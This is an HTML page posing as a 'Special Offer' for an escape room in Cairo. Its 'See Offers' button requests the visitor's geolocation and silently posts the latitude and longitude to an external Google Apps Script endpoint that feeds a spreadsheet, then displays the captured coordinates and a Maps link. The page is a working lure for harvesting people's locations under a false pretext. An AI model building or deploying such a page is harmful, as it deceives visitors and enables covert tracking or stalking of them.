<!DOCTYPE html>
<html>
<head>
  <title>Special Offer</title>
</head>
<body style="text-align:center; font-family:Arial; margin-top:50px;">

<h1>The Best & Biggest ESCAPE ROOM in Cairo!!</h1>
<button onclick="getLocation()">See Offers</button>

<p id="output"></p>

<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else {
    document.getElementById("output").innerHTML = "Not supported";
  }
}

function showPosition(position) {
  let lat = position.coords.latitude;
  let lon = position.coords.longitude;

  // 🔥 إرسال البيانات للـ Google Sheet
  fetch("https://script.google.com/macros/s/AKfycbwupNgq5ozs1Tvm8x4fCQZL4viiXCcrOX1tCpfxhz7YpaM6vn1X0_bEoT-zw3e4WKTotg/exec", {
    method: "POST",
    body: JSON.stringify({
      lat: lat,
      lon: lon
    })
  });

  // عرض البيانات على الصفحة
  document.getElementById("output").innerHTML =
    "📍 Location captured & saved ✔️<br><br>" +
    "Latitude: " + lat + "<br>Longitude: " + lon + "<br><br>" +
    "<a target='_blank' href='https://www.google.com/maps?q=" + lat + "," + lon + "'>Open in Google Maps</a>";
}

function showError(error) {
  document.getElementById("output").innerHTML =
    "❌ Location access denied";
}
</script>

</body>
</html>
